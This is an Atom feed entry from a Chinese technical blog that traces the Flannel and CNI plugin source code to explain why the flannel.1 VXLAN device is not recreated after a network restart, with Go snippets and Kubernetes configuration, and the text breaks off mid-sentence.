<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yiran&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://zdyxry.github.io/"/>
  <updated>2020-01-04T03:30:47.802Z</updated>
  <id>https://zdyxry.github.io/</id>
  
  <author>
    <name>yiran</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>为什么 flannel.1 丢失后不会自动重建</title>
    <link href="https://zdyxry.github.io/2020/01/03/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E7%9A%84-flannel-1-%E4%BC%9A%E6%B6%88%E5%A4%B1/"/>
    <id>https://zdyxry.github.io/2020/01/03/为什么你的-flannel-1-会消失/</id>
    <published>2020-01-03T14:20:37.000Z</published>
    <updated>2020-01-04T03:30:47.802Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在用 K8s 的同学应该多少都使用过 Flannel 作为自己的网络插件，不讨论性能稳定性，在复杂的网络环境配置中 Flannel 的要求应该是最低的，所以我通常使用 Flannel 作为 让 K8s Ready 的最后一步。</p><p>在使用过程中，遇到过多次 flannel.1 这个 link 消失的情况，查看官方 Issue 中有人提到过： <a href="https://github.com/coreos/flannel/issues/869" target="_blank" rel="noopener">flannel.1 is deleted by <code>service network restart</code>, and never recreated again.</a> ，但是这个 Issue 从 2017年创建一直到现在都处于 Open 状态，看上去社区也不打算去解决，其实不只是重启网络，如果没有特殊指定的话，找到默认网关所在的网卡，直接 ifdown ，flannel.1 也会丢失，并且不会重建，那为什么会出现这个问题，今天来看一看。</p><h2 id="CNI-Flannel-Plugin"><a href="#CNI-Flannel-Plugin" class="headerlink" title="CNI Flannel Plugin"></a>CNI Flannel Plugin</h2><p>我们常说的 Flannel 分为两部分：<a href="https://github.com/containernetworking/plugins/tree/master/plugins/meta/flannel" target="_blank" rel="noopener">CNI Flannel Plugin</a> 及 Flannel。</p><p>CNI Flannel Plugin 是 Flannel CNI 插件的具体接口实现， CNI 要求实现的 <code>cmdAdd</code> <code>cmdDel</code> <code>cmdCheck</code> 都是在这里实现的，来看看具体的调用流程：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">cmdAdd</span><span class="params">(args *skel.CmdArgs)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="comment">// 从标准输入加载配置</span></span><br><span class="line">n, err := loadFlannelNetConf(args.StdinData) </span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 加载子网配置：/run/flannel/subnet.env</span></span><br><span class="line">fenv, err := loadFlannelSubnetEnv(n.SubnetFile) </span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 执行添加动作</span></span><br><span class="line"><span class="keyword">return</span> doCmdAdd(args, n, fenv) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">doCmdAdd</span><span class="params">(args *skel.CmdArgs, n *NetConf, fenv *subnetEnv)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">n.Delegate[<span class="string">"name"</span>] = n.Name</span><br><span class="line"><span class="keyword">if</span> !hasKey(n.Delegate, <span class="string">"type"</span>) &#123;</span><br><span class="line">n.Delegate[<span class="string">"type"</span>] = <span class="string">"bridge"</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> n.CNIVersion != <span class="string">""</span> &#123;</span><br><span class="line">n.Delegate[<span class="string">"cniVersion"</span>] = n.CNIVersion</span><br><span class="line">&#125;</span><br><span class="line">n.Delegate[<span class="string">"ipam"</span>] = <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;</span><br><span class="line"><span class="string">"type"</span>:   <span class="string">"host-local"</span>,</span><br><span class="line"><span class="string">"subnet"</span>: fenv.sn.String(),</span><br><span class="line"><span class="string">"routes"</span>: []types.Route&#123;</span><br><span class="line">&#123;</span><br><span class="line">Dst: *fenv.nw,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 进行配置解析及填充后，执行委托类型插件进行配置，默认是 bridge，创建过程中会将配置保存到 /var/lib/cni/flannel ，删除时会用到</span></span><br><span class="line"><span class="keyword">return</span> delegateAdd(args.ContainerID, n.DataDir, n.Delegate)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里已经跟 Flannel Plugin 无关了，是调用的其他插件完成的具体动作，再来看看删除动作：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">cmdDel</span><span class="params">(args *skel.CmdArgs)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">nc, err := loadFlannelNetConf(args.StdinData)</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 执行删除动作</span></span><br><span class="line"><span class="keyword">return</span> doCmdDel(args, nc)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">doCmdDel</span><span class="params">(args *skel.CmdArgs, n *NetConf)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="comment">// 从 /var/lib/cni/flannel 中根据 ContainerID 读取配置，并在读取后删除配置</span></span><br><span class="line">    netconfBytes, err := consumeScratchNetConf(args.ContainerID, n.DataDir) </span><br><span class="line">    ...</span><br><span class="line">nc := &amp;types.NetConf&#123;&#125;</span><br><span class="line"><span class="keyword">if</span> err = json.Unmarshal(netconfBytes, nc); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"failed to parse netconf: %v"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 委托其他插件执行删除动作，默认 bridge</span></span><br><span class="line"><span class="keyword">return</span> invoke.DelegateDel(context.TODO(), nc.Type, netconfBytes, <span class="literal">nil</span>) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里我们来捋一捋整个流程：</p><ol><li>kubelet 启动时查找可用 CNI 插件，并根据配置加载</li><li>kubelet 创建容器前，通过 CNI Interface 调用相应方法执行 cmdAdd/cmdDel 命令</li><li>CNI 根据配置信息调用对应的 Plugin 执行 cmdAdd/cmdDel</li></ol><h3 id="相应文件路径"><a href="#相应文件路径" class="headerlink" title="相应文件路径"></a>相应文件路径</h3><h4 id="var-lib-cni-flannel"><a href="#var-lib-cni-flannel" class="headerlink" title="/var/lib/cni/flannel"></a>/var/lib/cni/flannel</h4><p>每个 Pod 的具体网络配置，配置内容如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@install2 09:29:48 cni]$pwd</span><br><span class="line">/var/lib/cni</span><br><span class="line">[root@install2 09:29:51 cni]$cat flannel/d3f1220d58a72ebe5a92f8febbe6dd45d3bff65dce0ff6960f732f202026c24c |jq</span><br><span class="line">&#123;</span><br><span class="line">  "cniVersion": "0.3.1",</span><br><span class="line">  "hairpinMode": true,</span><br><span class="line">  "ipMasq": false,</span><br><span class="line">  "ipam": &#123;</span><br><span class="line">    "routes": [</span><br><span class="line">      &#123;</span><br><span class="line">        "dst": "10.244.0.0/16"</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    "subnet": "10.244.1.0/24",</span><br><span class="line">    "type": "host-local"</span><br><span class="line">  &#125;,</span><br><span class="line">  "isDefaultGateway": true,</span><br><span class="line">  "isGateway": true,</span><br><span class="line">  "mtu": 1450,</span><br><span class="line">  "name": "cbr0",</span><br><span class="line">  "type": "bridge"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="var-lib-cni-networks"><a href="#var-lib-cni-networks" class="headerlink" title="/var/lib/cni/networks"></a>/var/lib/cni/networks</h4><p>IP 地址分配配置路径，默认 Flannel 使用的 ipam 是 host-local，bridge 是 cbr0 ，在这下面是已分配的 IP 地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@install2 09:31:48 cni]$pwd</span><br><span class="line">/var/lib/cni</span><br><span class="line">[root@install2 09:31:49 cni]$tree networks/</span><br><span class="line">networks/</span><br><span class="line">└── cbr0</span><br><span class="line">    ├── 10.244.1.160</span><br><span class="line">    ├── 10.244.1.161</span><br><span class="line">    ├── 10.244.1.162</span><br><span class="line">    ├── last_reserved_ip.0</span><br><span class="line">    └── lock</span><br><span class="line"></span><br><span class="line">1 directory, 5 files</span><br><span class="line">[root@install2 09:31:53 cni]$cat networks/cbr0/10.244.1.162</span><br><span class="line">d3f1220d58a72ebe5a92f8febbe6dd45d3bff65dce0ff6960f732f202026c24c</span><br><span class="line">[root@install2 09:32:07 cni]$cat networks/cbr0/last_reserved_ip.0</span><br><span class="line">10.244.1.162</span><br></pre></td></tr></table></figure><h4 id="etc-cni-net-d"><a href="#etc-cni-net-d" class="headerlink" title="/etc/cni/net.d"></a>/etc/cni/net.d</h4><p>CNI 插件配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@install2 09:34:47 net.d]$pwd</span><br><span class="line">/etc/cni/net.d</span><br><span class="line">[root@install2 09:34:48 net.d]$cat 10-flannel.conflist</span><br><span class="line">&#123;</span><br><span class="line">  "name": "cbr0",</span><br><span class="line">  "cniVersion": "0.3.1",</span><br><span class="line">  "plugins": [</span><br><span class="line">    &#123;</span><br><span class="line">      "type": "flannel",</span><br><span class="line">      "delegate": &#123;</span><br><span class="line">        "hairpinMode": true,</span><br><span class="line">        "isDefaultGateway": true</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      "type": "portmap",</span><br><span class="line">      "capabilities": &#123;</span><br><span class="line">        "portMappings": true</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概了解了 CNI Flannel Plugin ，说好的 <code>flannel.1</code> 呢？既然确定了 <code>flannel.1</code> 不是 CNI Plugin 里面实现的，那肯定就是 Flannel 自己的行为了，接下来看 <code>Flannel</code> 代码就可以了。</p><h2 id="Flannel"><a href="#Flannel" class="headerlink" title="Flannel"></a>Flannel</h2><p>提到 Flannel，就不得不拿出这张图：</p><img src="/2020/01/03/为什么你的-flannel-1-会消失/flannel.png" title="Flannel"><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~/go/src/github.com/coreos/flannel</span><br><span class="line">master ✗ $ tree . -L 1</span><br><span class="line">├── backend # 后端实现：vxlan,udp,hostgw</span><br><span class="line">├── main.go # 入口</span><br><span class="line">├── network # IPtables 相关配置</span><br><span class="line">├── pkg     # 辅助功能，如 IP，Namespace</span><br><span class="line">├── README.md</span><br><span class="line">├── subnet  # 子网管理，K8s 通信相关</span><br></pre></td></tr></table></figure><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><p>我们先来回想一下 K8s 集群部署，我们通过 kubeadm 指定了 Pod CIDR 为 <code>10.244.0.0/16</code> ：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiServer:</span> <span class="string">&#123;&#125;</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">kubeadm.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterConfiguration</span></span><br><span class="line"><span class="attr">kubernetesVersion:</span> <span class="string">""</span></span><br><span class="line"><span class="attr">networking:</span></span><br><span class="line"><span class="attr">  dnsDomain:</span> <span class="string">""</span></span><br><span class="line"><span class="attr">  podSubnet:</span> <span class="number">10.244</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line"><span class="attr">  serviceSubnet:</span> <span class="string">""</span></span><br></pre></td></tr></table></figure><p>然后我们直接执行 <code>kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</code> 等待 Node Ready 即可，这样做的前提是因为我们指定的 Pod 子网是 Flannel 默认子网，两者必须相同才可以配置正确。</p><h3 id="代码入口"><a href="#代码入口" class="headerlink" title="代码入口"></a>代码入口</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  ...</span><br><span class="line">sm, err := newSubnetManager()</span><br><span class="line">  ...</span><br><span class="line"><span class="comment">// 从 K8s 中获取配置信息，主要是子网信息</span></span><br><span class="line">config, err := getConfig(ctx, sm)</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// 创建 backend manager 并创建用来创建 backend 和注册网络</span></span><br><span class="line">bm := backend.NewManager(ctx, sm, extIface)</span><br><span class="line">be, err := bm.GetBackend(config.BackendType)</span><br><span class="line">  ...</span><br><span class="line">bn, err := be.RegisterNetwork(ctx, wg, config)</span><br><span class="line">  ...</span><br><span class="line"><span class="comment">// 运行 backend </span></span><br><span class="line">log.Info(<span class="string">"Running backend."</span>)</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">bn.Run(ctx)</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;()</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 main.go 中获取配置的来源是 ConfigMap：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[root@install1</span> <span class="number">11</span><span class="string">:00:39</span> <span class="string">~]$kubectl</span> <span class="string">get</span> <span class="string">cm</span> <span class="string">kube-flannel-cfg</span> <span class="bullet">-n</span> <span class="string">kube-system</span> <span class="bullet">-o</span> <span class="string">yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="string">cni-conf.json:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      "name": "cbr0",</span></span><br><span class="line"><span class="string">      "cniVersion": "0.3.1",</span></span><br><span class="line"><span class="string">      "plugins": [</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">          "type": "flannel",</span></span><br><span class="line"><span class="string">          "delegate": &#123;</span></span><br><span class="line"><span class="string">            "hairpinMode": true,</span></span><br><span class="line"><span class="string">            "isDefaultGateway": true</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">          "type": "portmap",</span></span><br><span class="line"><span class="string">          "capabilities": &#123;</span></span><br><span class="line"><span class="string">            "portMappings": true</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      ]</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  net-conf.json: |</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      "Network": "10.244.0.0/16",</span></span><br><span class="line"><span class="string">      "Backend": &#123;</span></span><br><span class="line"><span class="string">        "Type": "vxlan"</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span><span class="attr">kind:</span> <span class="string">ConfigMap</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  annotations:</span></span><br><span class="line"><span class="attr">  creationTimestamp:</span> <span class="string">"2019-12-30T02:37:21Z"</span></span><br><span class="line"><span class="attr">  labels:</span></span><br><span class="line"><span class="attr">    app:</span> <span class="string">flannel</span></span><br><span class="line"><span class="attr">    tier:</span> <span class="string">node</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">kube-flannel-cfg</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="attr">  resourceVersion:</span> <span class="string">"235454"</span></span><br><span class="line"><span class="attr">  selfLink:</span> <span class="string">/api/v1/namespaces/kube-system/configmaps/kube-flannel-cfg</span></span><br><span class="line"><span class="attr">  uid:</span> <span class="string">fd9f67ee-ee1b-411d-8403-23ab05de56c8</span></span><br></pre></td></tr></table></figure><p>可以看到默认的 Backend 是 vxlan，我们接着看 backend 和 vxlan 相关处理，在 backend/ 路径下放着些统一的接口定义，vxlan 是接口的具体实现：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~/go/src/github.com/coreos/flannel</span><br><span class="line">master ✗ $ tree backend -L 1</span><br><span class="line">backend</span><br><span class="line">├── common.go</span><br><span class="line">├── manager.go</span><br><span class="line">├── route_network.go</span><br><span class="line">├── route_network_test.go</span><br><span class="line">├── route_network_windows.go</span><br><span class="line">├── simple_network.go</span><br><span class="line">├── udp</span><br><span class="line">└── vxlan</span><br><span class="line">    ├── device.go</span><br><span class="line">    ├── device_windows.go</span><br><span class="line">    ├── vxlan.go</span><br><span class="line">    ├── vxlan_network.go</span><br><span class="line">    ├── vxlan_network_windows.go</span><br><span class="line">    └── vxlan_windows.go</span><br></pre></td></tr></table></figure><p>如 <code>RegisterNetwork</code>：<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Backend <span class="keyword">interface</span> &#123;</span><br><span class="line"><span class="comment">// Called when the backend should create or begin managing a new network</span></span><br><span class="line">RegisterNetwork(ctx context.Context, wg sync.WaitGroup, config *subnet.Config) (Network, error)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看看 vxlan RegisterNetwork 做了什么：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(be *VXLANBackend)</span> <span class="title">RegisterNetwork</span><span class="params">(ctx context.Context, wg sync.WaitGroup, config *subnet.Config)</span> <span class="params">(backend.Network, error)</span></span> &#123;</span><br><span class="line"><span class="comment">// 解析配置</span></span><br><span class="line">cfg := <span class="keyword">struct</span> &#123;</span><br><span class="line">VNI           <span class="keyword">int</span></span><br><span class="line">Port          <span class="keyword">int</span></span><br><span class="line">GBP           <span class="keyword">bool</span></span><br><span class="line">Learning      <span class="keyword">bool</span></span><br><span class="line">DirectRouting <span class="keyword">bool</span></span><br><span class="line">&#125;&#123;</span><br><span class="line">VNI: defaultVNI,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// vtep 配置信息</span></span><br><span class="line">devAttrs := vxlanDeviceAttrs&#123;</span><br><span class="line">vni:       <span class="keyword">uint32</span>(cfg.VNI),</span><br><span class="line">name:      fmt.Sprintf(<span class="string">"flannel.%v"</span>, cfg.VNI),</span><br><span class="line">vtepIndex: be.extIface.Iface.Index,</span><br><span class="line">vtepAddr:  be.extIface.IfaceAddr,</span><br><span class="line">vtepPort:  cfg.Port,</span><br><span class="line">gbp:       cfg.GBP,</span><br><span class="line">learning:  cfg.Learning,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建 vtep</span></span><br><span class="line">dev, err := newVXLANDevice(&amp;devAttrs)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">dev.directRouting = cfg.DirectRouting</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newVXLANDevice</span><span class="params">(devAttrs *vxlanDeviceAttrs)</span> <span class="params">(*vxlanDevice, error)</span></span> &#123;</span><br><span class="line">  <span class="comment">// netlink 是 Golang 中操作网络相关的库，提供了创建 Vxlan 设备的接口</span></span><br><span class="line">link := &amp;netlink.Vxlan&#123;</span><br><span class="line">LinkAttrs: netlink.LinkAttrs&#123;</span><br><span class="line">Name: devAttrs.name,</span><br><span class="line">&#125;,</span><br><span class="line">VxlanId:      <span class="keyword">int</span>(devAttrs.vni),</span><br><span class="line">VtepDevIndex: devAttrs.vtepIndex,</span><br><span class="line">SrcAddr:      devAttrs.vtepAddr,</span><br><span class="line">Port:         devAttrs.vtepPort,</span><br><span class="line">Learning:     devAttrs.learning,</span><br><span class="line">GBP:          devAttrs.gbp,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">link, err := ensureLink(link)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;vxlanDevice&#123;</span><br><span class="line">link: link,</span><br><span class="line">&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ensureLink</span><span class="params">(vxlan *netlink.Vxlan)</span> <span class="params">(*netlink.Vxlan, error)</span></span> &#123;</span><br><span class="line">err := netlink.LinkAdd(vxlan)</span><br><span class="line"><span class="keyword">if</span> err == syscall.EEXIST &#123;</span><br><span class="line"><span class="comment">// it's ok if the device already exists as long as config is similar</span></span><br><span class="line">    log.V(<span class="number">1</span>).Infof(<span class="string">"VXLAN device already exists"</span>)</span><br><span class="line">    ...</span><br><span class="line"><span class="comment">// 如果存在，则娇艳 原有设备是否兼容，如果不兼容则删除并重新创建设备</span></span><br><span class="line"><span class="keyword">if</span> err = netlink.LinkAdd(vxlan); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"failed to create vxlan interface: %v"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"><span class="keyword">return</span> vxlan, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里我们就知道了是 Flannel 在进行 backend 注册的时候创建的 <code>flannel.1</code> 设备，如果我们想要简单粗暴的去修改代码实现，我们可以在 <code>backend.Run()</code> 方法中加入 <code>ensureLink</code> 检测逻辑，保证当发现对应 vtep 设备消失时，重新创建。但是这种实现方式就比较侵入，而且破坏了 backend 通用逻辑，我理解正确的处理方式应该是通过 health 探针去检测，如果检测到 Pod 处于 unhealthy 状态，自动重建 Pod，会重新进行 <code>backend.RegisterNetwork</code> 逻辑，就不存在这个问题了。</p><p>来看下默认的 Flannel YAML 文件，发现其中并没有 health 探针配置，还是有点奇怪的，这么一个基础的服务，居然没有做任何的健康检查，听上去有些不合道理。</p><p>于是我又去 Github 